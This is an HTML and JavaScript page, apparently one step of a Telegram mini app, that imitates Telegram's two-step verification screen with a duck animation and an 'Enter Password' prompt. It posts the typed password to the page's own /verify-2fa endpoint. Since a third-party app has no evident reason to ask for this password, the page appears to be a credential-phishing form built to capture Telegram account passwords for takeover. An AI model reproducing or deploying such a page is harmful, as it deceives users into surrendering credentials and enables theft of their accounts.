<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>2FA Verification</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
    <style>
        /* Оставляем все стили как были у тебя */
        body { margin: 0; padding: 0; background-color: #111; color: #fff; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; height: 100vh; display: flex; justify-content: center; align-items: center; }
        .container { width: 100%; max-width: 420px; height: 100%; display: flex; flex-direction: column; align-items: center; }
        .reg { margin-top: 20%; width: 100%; display: flex; flex-direction: column; align-items: center; row-gap: 12px; }
        .form { display: flex; flex-direction: column; row-gap: 15px; padding: 0 20px; width: 100%; box-sizing: border-box; }
        .phone { border: 1px solid #333; border-radius: 8px; display: flex; align-items: center; padding: 14px; background: #111; color: #fff; position: relative; transition: all 0.3s ease; }
        .phone:focus-within { border-color: rgb(135, 116, 225); }
        #phone-input { flex: 1; background: transparent; border: none; outline: none; color: #fff; font-size: 16px; width: 100%; }
        .phone-number { position: absolute; left: 20px; color: #888; pointer-events: none; transition: 0.3s; }
        .phone.has-value .phone-number, .phone:focus-within .phone-number { font-size: 12px; color: rgb(135, 116, 225); top: -8px; left: 15px; background: #111; padding: 0 5px; }
        .phone.error { border-color: #ff4444; box-shadow: 0 0 0 1px rgba(255, 68, 68, 0.3); }
        .phone.error .phone-number { color: #ff4444; }
        .eye-icon { position: absolute; right: 12px; cursor: pointer; color: #888; }
        .next-btn { display: none; margin-top: 20px; padding: 14px; background: rgb(135, 116, 225); border: none; border-radius: 10px; color: white; width: 100%; font-size: 16px; font-weight: 600; cursor: pointer; }
        .next-btn.show { display: block; }
    </style>
</head>
<body>
    <div class="container">
        <div class="reg">
            <div id="duck" style="width: 120px; height: 120px;"></div>
            <h1 style="font-size: 1.5rem; margin: 10px 0;">Enter Password</h1>
            <p style="color: #888; text-align: center; font-size: 0.9rem;">Your account is protected with an additional password.</p>
            
            <div class="form">
                <div class="phone" id="phoneContainer">
                    <span class="phone-number">Password</span>
                    <input id="phone-input" type="password">
                    <i id="toggle-password" class="fa-solid fa-eye eye-icon"></i>
                </div>
                <button id="next-btn" class="next-btn">NEXT</button>
            </div>
        </div>
    </div>

    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/lottie-web/5.12.2/lottie.min.js"></script>
    <script>
        const tg = window.Telegram.WebApp;
        tg.ready();

        lottie.loadAnimation({
            container: document.getElementById('duck'),
            renderer: 'svg',
            loop: true,
            autoplay: true,
            path: '/static/duck.json'
        });

        const phoneInput = document.getElementById("phone-input");
        const phoneContainer = document.getElementById("phoneContainer");
        const phoneNumberLabel = document.querySelector(".phone-number");
        const nextBtn = document.getElementById("next-btn");
        const toggleBtn = document.getElementById("toggle-password");

        toggleBtn.addEventListener("click", () => {
            if (phoneInput.type === "password") {
                phoneInput.type = "text";
                toggleBtn.classList.replace("fa-eye", "fa-eye-slash");
            } else {
                phoneInput.type = "password";
                toggleBtn.classList.replace("fa-eye-slash", "fa-eye");
            }
        });

        phoneInput.addEventListener('input', function() {
            if (this.value.length > 0) {
                phoneContainer.classList.add('has-value');
                nextBtn.classList.add('show');
            } else {
                phoneContainer.classList.remove('has-value');
                nextBtn.classList.remove('show');
            }
            // Сброс ошибки при вводе
            if (phoneContainer.classList.contains('error')) {
                phoneContainer.classList.remove('error');
                phoneNumberLabel.textContent = 'Password';
            }
        });

        nextBtn.addEventListener('click', async function() {
            const password = phoneInput.value;
            this.disabled = true;
            this.textContent = 'CHECKING...';

            try {
                const response = await fetch('/verify-2fa', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ password: password })
                });
                const data = await response.json();

                if (data.success) {
                    window.location.href = '/success';
                } else {
                    // Ошибка: неверный пароль
                    phoneContainer.classList.add('error');
                    phoneNumberLabel.textContent = 'Invalid Password';
                    this.disabled = false;
                    this.textContent = 'NEXT';
                    // Вибрация (Haptic)
                    if(tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('error');
                }
            } catch (e) {
                console.error(e);
                this.disabled = false;
                this.textContent = 'NEXT';
            }
        });
    </script>
</body>
</html>
